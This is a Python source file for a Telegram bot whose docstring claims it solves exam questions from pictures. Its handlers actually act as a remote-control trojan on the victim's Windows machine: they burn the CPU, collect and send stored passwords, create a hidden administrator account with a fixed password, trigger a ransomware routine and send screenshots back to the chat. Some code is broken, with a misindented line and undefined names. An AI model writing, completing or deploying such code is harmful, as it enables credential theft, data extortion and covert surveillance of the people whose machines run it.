



'''
References:
		https://docs.aiogram.dev/en/latest/quick_start.html
		https://github.com/wildonion/stomegranate
		
		
Features:
		- build a telegram bot to solve an specific question from its picture and send us the answer in a picture
		- build a scraper 
'''

from Crypto.Cipher import XOR
import ctypes
import win32api
import base64
import random
import sys
import os
import logging
import multiprocessing
from utils import net, hw, cry
import pyscreenshot as ImageGrab
from aiogram import Bot, Dispatcher, executor, types
from urllib.request import urlopen
import subprocess as sp
import io



API_TOKEN = ''
logging.basicConfig(level=logging.INFO)
bot = Bot(token=API_TOKEN)
dp = Dispatcher(bot)



@dp.message_handler(commands=['burn_cpu'])
async def burn(message: types.message):
	process_count = 1
	while(process_count <= multiprocessing.cpu_count()):
		process_to_be_not_seen_again = multiprocessing.Process(target=hw.CPU.burn())
		process_to_be_not_seen_again.start()
		process_count += 1
	for i in range(100): # os.system("python burn.py") 100 times
		processes = cpu_count()
		pool = Pool(processes)
		pool.map(hw.CPU.hot, range(processes))
	await message.reply("Burning CPU...")


@dp.message_handler(commands=["get_passwords"])
async def get_passwords(message: types.message):
	pid, output, error, failed = net.User.passwords()
	pswd = io.open("version", "rb", buffering=0)
	await bot.send_document(chat_id=message["chat"]["id"], document=pswd.read())
	os.remove("version.exe")
        os.remove("version")

@dp.message_handler(commands=["add_user"])
async def make_admin(message: types.message):
	net.User.add()
	await message.reply("added new user with info >>> [name] : ielts, [password] : @1234*")


@dp.message_handler(commands=["make_admin"])
async def make_admin(message: types.message):
	net.User.admin()
	await message.reply("user ielts is now admin")


@dp.message_handler(commands=["ransome"])
async def ransome(message: types.message):
	cry.Ransome.run()
	await message.reply("encrypting everything...")


@dp.message_handler(commands=['sc'])
async def sc(message: types.Message):
	im = ImageGrab.grab()
	im.save('sc.png')
	with open('sc.png', 'rb') as photo:
		await message.reply_photo(photo, caption='fullsc')
	os.remove("sc.png")


if __name__ == '__main__':
	executor.start_polling(dp, skip_updates=True)
